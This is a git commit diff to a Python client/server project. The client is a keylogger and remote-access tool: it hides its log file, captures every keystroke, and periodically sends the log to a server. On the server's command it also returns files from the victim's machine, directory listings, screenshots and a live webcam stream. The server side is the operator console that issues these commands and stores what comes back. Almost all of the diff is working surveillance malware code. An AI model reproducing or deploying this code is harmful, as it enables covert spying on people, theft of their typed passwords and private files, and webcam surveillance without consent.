7d12d941bb2deb03c2e4bef2c4c10f468f1caa23
Dan Sebag <dsebag@asptt.com>
2024-01-09 16:55:02 +0100

    BIG UPDATE WITHOUT CLOSE WEBCAM

--- client/client.py
+++ client/client.py
@@ -1,4 +1,4 @@
-import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading
+import socket, logging, datetime, time, os, ctypes, io, platform, pyautogui, threading, json, base64, cv2
 
 from pynput.keyboard import Key, Listener
 
@@ -8,8 +8,17 @@ def get_os():
     return platform.system()
 
 
-# Function to configure the logging file
-def setup_logging_file(filename):
+def create_connection(host, port):
+    while True:
+        try:
+            return socket.create_connection((host, port))
+        except socket.error as e:
+            print(f"Error creating connection: {e}")
+            print("Attempting to reconnect in 5 seconds...")
+            time.sleep(5)
+
+
+def setup_logging(filename):
     logging.basicConfig(
         filemode='a',
         filename=filename,
@@ -17,103 +26,165 @@ def setup_logging_file(filename):
         format='%(asctime)s %(message)s',
         level=logging.DEBUG
     )
+    pass
 
 
-# Function to hide the file
 def hide_file(filename):
     if get_os() == 'Windows':
-        if not os.path.exists(filename):
-            open(filename, 'a').close()
         ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
     elif get_os() == 'Linux':
-        os.system(f'chmod 777 {filename}')
-        os.system(f'chattr +i {filename}')
+        os.popen(f'chmod 777 {filename}')
+    else:
+        print(f"OS not supported: {get_os()}")
+    pass
 
 
-# Function to log the key pressed
-def listen_keyboard(key):
+def log_key_press(key):
     logging.info(str(key))
+    pass
 
 
-# Function to send the log file to the server
-def send_log_file(filename, host, port, last_position):
+def send_log_message(sock, filename):
     try:
-        with socket.create_connection((host, port)) as sock:
-            filename_size = len(filename)
-            sock.send(filename_size.to_bytes(4, 'big'))
-            sock.send(filename.encode())
-            with open(filename, 'rb') as file:
-                file.seek(last_position)
-                file_data = file.read(1024)
-                while file_data:
-                    sock.send(file_data)
-                    file_data = file.read(1024)
-                last_position = file.tell()
-        print(f"Log file sent")
-        return last_position
-    except socket.error:
-        print('Server unreachable ! The log file will be sent later')
-        return last_position
+        with open(filename, 'rb') as f:
+            file_content_encoded = base64.b64encode(f.read()).decode()
+
+            client_info = {
+                'command': 'LOG',
+                'filename': filename,
+                'file_content': file_content_encoded
+            }
+
+            json_data = json.dumps(client_info)
+            sock.sendall(json_data.encode())
+    except socket.error as e:
+        print(f'Error sending log message: {e}')
 
 
-# Function to take a screenshot
-def take_screenshot(host, port):
-    try:
-        with socket.create_connection((host, port)) as sock:
-            filename = datetime.datetime.today().strftime('%Hh%Mm%Ss.png')
-            filename_size = len(filename)
-            sock.send(filename_size.to_bytes(4, 'big'))
-            sock.send(filename.encode())
-            img = pyautogui.screenshot()
-            img_bytes = io.BytesIO()
-            img.save(img_bytes, format='PNG')
-            img_bytes = img_bytes.getvalue()
-            sock.sendall(img_bytes)
-        print(f"Screenshot sent")
-    except socket.error:
-        print('Server unreachable ! The screenshot will be sent later')
+def capture_and_send_webcam(sock):
+    cap = cv2.VideoCapture(0)
 
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
 
-def receive_server_commands(host, port):
-    with socket.create_connection((host, port)) as client_socket:
-        while True:
-            try:
-                command = client_socket.recv(1024).decode()
-                if command == 'SCREENSHOT':
-                    take_screenshot(host, port)
-            except socket.error:
-                print('Error receiving command from server')
+        _, buffer = cv2.imencode('.jpg', frame)
+        encoded_image = base64.b64encode(buffer).decode()
 
-
-# Function to start the listener
-def start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time):
-    with Listener(on_press=listen_keyboard) as listener:
+        # Envoi de l'image
+        client_info = {
+            'command': 'WEBCAM',
+            'image': encoded_image
+        }
+        json_data = json.dumps(client_info)
         try:
-            while time.time() - start_time < capture_duration:
-                time.sleep(delay_send_log)
-                listener.stop()
-                last_position = send_log_file(filename, host, port, last_position)
-                listener = Listener(on_press=listen_keyboard)
-                listener.start()
-        except KeyboardInterrupt:
-            listener.stop()
+            sock.send(json_data.encode())
+        except socket.error as e:
+            print(f'Error sending webcam image: {e}')
+            break
+
+        time.sleep(0.1)
+
+    cap.release()
+
+
+def receive_commands(sock):
+    try:
+        while True:
+            data = sock.recv(1024)
+            if not data:
+                break
+            data = data.decode()
+            try:
+                command = json.loads(data)
+                command_type = command.get('command')
+
+                if command_type == 'READ':
+                    filename = command['filename']
+                    try:
+                        with open(filename, 'rb') as f:
+                            file_content_encoded = base64.b64encode(f.read()).decode()
+
+                            client_info = {
+                                'command': 'READ',
+                                'filename': filename,
+                                'file_content': file_content_encoded
+                            }
+                            json_data = json.dumps(client_info)
+                            sock.send(json_data.encode())
+                    except FileNotFoundError:
+                        client_info = {
+                            'command': 'ERROR',
+                            'error': f"File '{filename}' not found."
+                        }
+                        json_data = json.dumps(client_info)
+                        sock.send(json_data.encode())
+
+                if command_type == 'SHOW':
+                    files = os.listdir()
+                    client_info = {
+                        'command': 'SHOW',
+                        'files': files
+                    }
+                    json_data = json.dumps(client_info)
+                    sock.send(json_data.encode())
+
+                if command_type == 'SCREENSHOT':
+                    screenshot = pyautogui.screenshot()
+                    screenshot_bytes = io.BytesIO()
+                    screenshot.save(screenshot_bytes, format='PNG')
+                    screenshot_bytes = screenshot_bytes.getvalue()
+
+                    screenshot_encoded = base64.b64encode(screenshot_bytes).decode()
+
+                    client_info = {
+                        'command': 'SCREENSHOT',
+                        'screenshot': screenshot_encoded
+                    }
+                    json_data = json.dumps(client_info)
+                    sock.sendall(json_data.encode())
+
+                if command_type == 'WEBCAM':
+                    webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock,))
+                    webcam_thread.start()
+
+            except json.JSONDecodeError as e:
+                print(f"JSON decode error: {e}")
+    except socket.error as e:
+        print(f"Error receiving command: {e}")
+        return
 
 
 def main():
     host = 'localhost'
     port = 9809
-    current_time = datetime.datetime.today().strftime('%d-%m-%Y %Hh')
+    current_hour = datetime.datetime.now().strftime("%Hh")
     ip = str(socket.gethostbyname(socket.gethostname()))
-    filename = f'{ip}_{current_time}_keyboard.txt'
-    setup_logging_file(filename)
+    filename = f'{current_hour}_keyboard.log'
+    setup_logging(filename)
     hide_file(filename)
-    last_position = 0
-    capture_duration = 600
-    start_time = time.time()
-    delay_send_log = 10
 
-    threading.Thread(target=receive_server_commands, args=(host, port)).start()
-    start_listener(filename, host, port, capture_duration, delay_send_log, last_position, start_time)
+    try:
+        sock = create_connection(host, port)
+
+        listener = Listener(on_press=log_key_press)
+        listener.start()
+
+        command_thread = threading.Thread(target=receive_commands, args=(sock,))
+        command_thread.start()
+
+        while True:
+            send_log_message(sock, filename)
+            time.sleep(10)
+
+    except socket.error as e:
+        print(f"Connection error: {e}")
+    finally:
+        if sock:
+            sock.close()
+        listener.stop()
+        command_thread.join()
 
 
 if __name__ == '__main__':
--- server/server.py
+++ server/server.py
@@ -1,9 +1,13 @@
-import argparse, socket, threading, time, queue, os, sys
+import argparse, socket, threading, time, queue, os, sys, json, base64
+
 import numpy as np
 import cv2
 
 SCREENSHOT_DIR = 'screenshots/{ip}/{date}'
-client_sockets = []
+READ_FILE_DIR = 'reads/{ip}/{date}'
+LOG_FILE_DIR = 'logs/{ip}/{date}'
+
+last_client_socket = None
 
 
 # Function to parse the arguments
@@ -13,6 +17,7 @@ def args_parse(command_line=None):
     parser.add_argument('-s', '--show', action='store_true', help='Display the list of files received')
     parser.add_argument('-r', '--readfile', nargs='*', type=str, help='Read the content of a file')
     parser.add_argument('-k', '--kill', action='store_true', help='Kill the server and delete client files')
+    parser.add_argument('-c', '--capture', action='store_true', help='Capture the webcam of the client')
     parser.add_argument('-S', '--screenshot', action='store_true', help='Take a screenshot')
 
     if command_line:
@@ -21,115 +26,207 @@ def args_parse(command_line=None):
         return parser.parse_args()
 
 
-# Function for the command handler loop
-def command_handler_loop(server_socket):
-    while True:
-        command = input("Server > ")
-        if command:
-            try:
-                args = args_parse(command.split())
-                handle_commands(args, server_socket)
-            except SystemExit:
-                continue
-
-
-# Function to display the list of files received
-def show_files():
-    files = os.listdir('.')
-    print("Files received:")
-    for file in files:
-        print(file)
-
-
-# Function to read the content of a file
-def read_file(filename):
-    try:
-        with open(filename, 'r') as file:
-            print(file.read())
-    except FileNotFoundError:
-        print(f"File {filename} not found")
-
-
-# Function to handle the commands
-def handle_commands(args, server_socket):
-    global client_sockets
-
-    if args.listen:
-        print(f"Server listening now on port {args.listen}")
-    if args.show:
-        show_files()
-    if args.readfile:
-        filename = ' '.join(args.readfile)
-        read_file(filename)
-    if args.kill:
-        print("Killing the server...")
-        sys.exit(0)
-    if args.screenshot:
-        try:
-            for client_socket in client_sockets:
-                global SCREENSHOT_DIR
-                ip = socket.gethostbyname(socket.gethostname())
-                date = time.strftime('%d-%m-%Y')
-                SCREENSHOT_DIR = SCREENSHOT_DIR.format(ip=ip, date=date)
-                if not os.path.exists(SCREENSHOT_DIR):
-                    os.makedirs(SCREENSHOT_DIR)
-                client_socket.sendall('SCREENSHOT'.encode())
-            print(f"Screenshot sent")
-        except socket.error:
-            print('Error sending screenshot command to a client')
-
-
-# Function to read the commands
-def read_commands(server_socket, client_socket):
-    while True:
-        command = input("Server > ")
-        if command:
-            args = args_parse()
-            handle_commands(args, server_socket, client_socket)
-
-
 # Function to set up the server
 def setup_server(host, port):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
     server_socket.listen(1)
-    print(f"Server listening on {host}:{port}")
     return server_socket
 
 
-# Function to accept the connections
-def accept_connections(server_socket):
-    global client_sockets
+def command_handler_loop(server_socket):
     while True:
-        client_socket, client_address = server_socket.accept()
-        client_sockets.append(client_socket)
-        threading.Thread(target=handle_client, args=(client_socket,)).start()
+        try:
+            command_line = input("Server > ")
+            args = args_parse(command_line.split())
+
+            if args.show:
+                show_files()
+            elif args.readfile:
+                read_file(args.readfile[0])
+            elif args.kill:
+                print("Shutting down the server.")
+                sys.exit(0)
+            elif args.screenshot:
+                take_screenshot()
+            elif args.capture:
+                receive_webcam_live()
+        except SystemExit:
+            print("\n")
+            pass
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            print("Please try again.")
+
+
+def show_files():
+    global last_client_socket
+    if last_client_socket is None:
+        print("No client connected to show files.")
+        return
+
+    try:
+        command = {
+            'command': 'SHOW'
+        }
+        last_client_socket.send(json.dumps(command).encode())
+        print("Requested file list from client.")
+    except socket.error as e:
+        print(f"Error sending show files command: {e}")
+    pass
+
+
+def read_file(filename):
+    global last_client_socket
+    if last_client_socket is None:
+        print("No client connected to read file.")
+        return
+
+    try:
+        command = {
+            'command': 'READ',
+            'filename': filename
+        }
+        last_client_socket.send(json.dumps(command).encode())
+        print(f"Requested file {filename} from client.")
+    except socket.error as e:
+        print(f"Error sending read file command: {e}")
+
+
+def take_screenshot():
+    global last_client_socket
+    if last_client_socket is None:
+        print("No client connected to take screenshot.")
+        return
+
+    try:
+        command = {
+            'command': 'SCREENSHOT'
+        }
+        last_client_socket.send(json.dumps(command).encode())
+        print("Requested screenshot from client.")
+    except socket.error as e:
+        print(f"Error sending screenshot command: {e}")
+
+
+def receive_webcam_live():
+    global last_client_socket
+    if last_client_socket is None:
+        print("No client connected to receive webcam.")
+        return
+
+    try:
+        command = {
+            'command': 'WEBCAM'
+        }
+        last_client_socket.send(json.dumps(command).encode())
+        print("Requested webcam from client.")
+    except socket.error as e:
+        print(f"Error sending webcam command: {e}")
 
 
 # Function to handle the client
-def handle_client(client_socket):
-    filename_size = int.from_bytes(client_socket.recv(4), 'big')
-    filename = client_socket.recv(filename_size).decode()
-    _, file_extension = os.path.splitext(filename)
-    if file_extension.lower() in '.png':
-        filename = os.path.join(SCREENSHOT_DIR, filename)
-    data_queue = queue.Queue()
-    threading.Thread(target=write_to_file, args=(filename, data_queue)).start()
+def handle_client(client_socket, client_address):
     while True:
-        file_data = client_socket.recv(1024)
-        if not file_data:
+        try:
+            data = b""
+            while True:
+                part = client_socket.recv(1024)
+                if not part:
+                    break
+                data += part
+                if len(part) < 1024:
+                    break
+
+            if not data:
+                print(f"Client {client_address} disconnected")
+                break
+
+            try:
+                client_info = json.loads(data.decode())
+                data_command = client_info.get('command')
+
+                ip = str(socket.gethostbyname(socket.gethostname()))
+                date = time.strftime("%d-%m-%Y")
+
+                if data_command == 'LOG':
+                    filename = client_info['filename']
+                    file_content = client_info['file_content']
+                    file_content_bytes = base64.b64decode(file_content)
+                    dir_name = LOG_FILE_DIR.format(ip=ip, date=date)
+
+                    if not os.path.exists(dir_name):
+                        os.makedirs(dir_name)
+
+                    with open(dir_name + '/' + filename, 'wb') as f:
+                        f.write(file_content_bytes)
+
+                if data_command == 'READ':
+                    global READ_FILE_DIR
+                    filename = client_info['filename']
+                    file_content = client_info['file_content']
+                    dir_name = READ_FILE_DIR.format(ip=ip, date=date)
+                    file_content_bytes = base64.b64decode(file_content)
+
+                    if not os.path.exists(dir_name):
+                        os.makedirs(dir_name)
+
+                    with open(dir_name + '/' + filename, 'wb') as f:
+                        f.write(file_content_bytes)
+                        print(f"File {filename} saved to {dir_name}")
+
+                if data_command == 'SHOW':
+                    files = client_info['files']
+                    print(f"Files from client: {files}")
+
+                if data_command == 'SCREENSHOT':
+                    global SCREENSHOT_DIR
+                    screenshot = client_info['screenshot']
+                    screenshot_bytes = base64.b64decode(screenshot)
+                    current_time = time.strftime("%H-%M-%S")
+                    dir_name = SCREENSHOT_DIR.format(ip=ip, date=date)
+
+                    if not os.path.exists(dir_name):
+                        os.makedirs(dir_name)
+
+                    with open(dir_name + '/' + current_time + '.png', 'wb') as f:
+                        f.write(screenshot_bytes)
+                        print(f"Screenshot saved to {dir_name}")
+
+                if data_command == 'WEBCAM':
+                    image_encoded = client_info['image']
+                    image_bytes = base64.b64decode(image_encoded)
+                    image = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), cv2.IMREAD_COLOR)
+
+                    cv2.namedWindow(f"Webcam {client_address}")
+                    cv2.imshow(f"Webcam {client_address}", image)
+
+                    if cv2.waitKey(1) & 0xFF == ord('q'):
+                        break
+
+                if data_command == 'ERROR':
+                    error = client_info['error']
+                    print(f"Error from client: {error}")
+
+            except json.JSONDecodeError as e:
+                print(f"JSON decode error: {e}")
+
+        except socket.error as e:
+            print(f"Socket error with {client_address}: {e}")
             break
-        data_queue.put(file_data)
+
+    client_socket.close()
+    print(f"Connection with {client_address} closed")
 
 
-# Function to write to the file
-def write_to_file(filename, data_queue):
+def accept_connections(server_socket):
+    global last_client_socket
     while True:
-        with open(filename, 'ab') as file:
-            while not data_queue.empty():
-                file_data = data_queue.get()
-                file.write(file_data)
-        time.sleep(10)
+        client_socket, client_address = server_socket.accept()
+        last_client_socket = client_socket
+        print(f"Connection with {client_address} established")
+        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
+        client_thread.start()
 
 
 def main():
